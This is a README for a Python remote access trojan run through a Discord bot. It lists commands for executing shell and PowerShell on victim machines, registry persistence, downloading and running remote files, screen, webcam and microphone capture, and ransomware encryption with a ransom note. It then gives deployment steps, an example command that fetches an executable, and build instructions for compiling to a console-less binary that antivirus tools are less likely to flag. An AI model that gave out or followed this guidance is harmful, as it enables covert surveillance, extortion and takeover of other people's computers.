# Python Discord RAT
- Made by AkiraDev7004

---

### Features

| Command | Description |
|---------|-------------|
| `!cmd <command>` | Execute a CMD/PowerShell command |
| `!pw <powershell command>` | Execute PowerShell specifically |
| `!help` | List all available commands |
| `!startup` | Enable Windows startup persistence (registry) |
| `!checkadmin` | Check if running as Administrator |
| `!upload <url> [hidden]` | Upload and execute a file from URL |
| `!joinvc [screen_num]` | Join voice channel in victim category & stream screen |
| `!selectscreen <Nummer>` | Select which screen to stream with !joinvc (1-4) |
| `!screenshot` | Take screenshot of all screens |
| `!webcam` | Capture image from all webcams |
| `!selectmic` | Select microphone for audio streaming |
| `!ransomware [on/off]` | Encrypt all files & show ransom note overlay |

---

### Installation

**Prerequisites:** Python 3.8+ and pip installed.

```bash
# Create virtual environment
python -m venv .venv
source .venv/bin/activate   # Linux/macOS
# .venv\Scripts\activate    # Windows

# Install dependencies
pip install discord.py mss cv2 sounddevice
```

**Copy the bot code:** Save the provided Python script as `rat.py` (or any name you prefer).

---

### Usage

1. **Get a Discord Bot Token:** Go to [Discord Developer Portal](https://discord.com/developers/applications) → create an application → OAuth2 → URL Generator with scopes: `bot`. Copy the token from Settings → Tokens.

2. **Edit the bot file:** Replace `YOUR_TOKEN_HERE` in the code with your actual Discord token.

3. **Run the bot:**
   ```bash
   python rat.py
   ```

4. **Use commands via Discord:** Open a channel where the bot has permission to send messages, then type commands prefixed with `!`. Example:
   ```
   !help
   !cmd whoami
   !pw Get-Process
   !startup
   !checkadmin
   !upload https://example.com/virus.exe true
   !joinvc
   !screenshot
   !webcam
   !selectmic
   !ransomware on
   ```

---

### Security Notes / OPSEC

- **This is an educational example.** Do not hardcode secrets, keys, or IPs. Use environment variables or config files instead.
- Build with Nuitka for better protection (see the Python to Executable Guide).
- Test thoroughly in a sandbox before deploying on real systems.
- Remember that `!joinvc` creates voice channels per victim category; ensure your Discord server has enough space.

---


# How to convert the file into an .exe?


## Nuitka (Recommended for better protection & performance)

Compiles Python to C then to native code. Harder to reverse, smaller/faster binaries, fewer false positives.

### Installation (Debian/Linux)
```bash
sudo apt update
sudo apt install python3 python3-pip python3-venv gcc
python3 -m venv .venv
source .venv/bin/activate
pip install nuitka ordered-set zstandard
```

### On Windows
Install Python + a C compiler (Visual Studio Build Tools or MinGW), then:
```bash
pip install nuitka
```

### Basic Builds
**Standalone onefile:**
```bash
python -m nuitka --standalone --onefile --remove-output your_script.py
```

**With no console + anti-bloat:**
```bash
python -m nuitka --standalone --onefile --windows-disable-console --remove-output --enable-plugin=anti-bloat --python-flag=no_docstrings your_script.py
```

## Which One to Choose?

| Feature          | PyInstaller      | Nuitka                  |
|------------------|------------------|-------------------------|
| Speed of build   | Fast             | Slower                  |
| Runtime speed    | Same as Python   | Faster                  |
| Reverse difficulty | Easy (bytecode) | Harder (native code)    |
| Antivirus flags  | More common      | Less common             |
| Best for         | Quick & dirty    | Production / OPSEC      |

## Cross-Platform Notes

- Nuitka and PyInstaller build for the OS they run on.
- For Windows `.exe` from Linux: use Wine + Windows Python (advanced).

## PyInstaller

Fast and simple bundling. Great for quick prototypes.

### Installation
```bash
python -m venv .venv
source .venv/bin/activate   # Linux/macOS
# .venv\Scripts\activate    # Windows

pip install pyinstaller
```

### Basic Builds
**Single file:**
```bash
pyinstaller --onefile your_script.py
```

**Single file, no console (GUI apps):**
```bash
pyinstaller --onefile --noconsole your_script.py
```

**With icon:**
```bash
pyinstaller --onefile --noconsole --icon=icon.ico your_script.py
```

**One-folder mode (often better for antivirus):**
```bash
pyinstaller --onedir your_script.py
```

Output is in the `dist/` folder.

### Common Options
- `--clean` – clean cache
- `--hidden-import=module` – force include module
- `--add-data "src;dest"` – add data files (use `:` on Linux)

---

Choose Nuitka when you want better protection and performance, PyInstaller for speed.
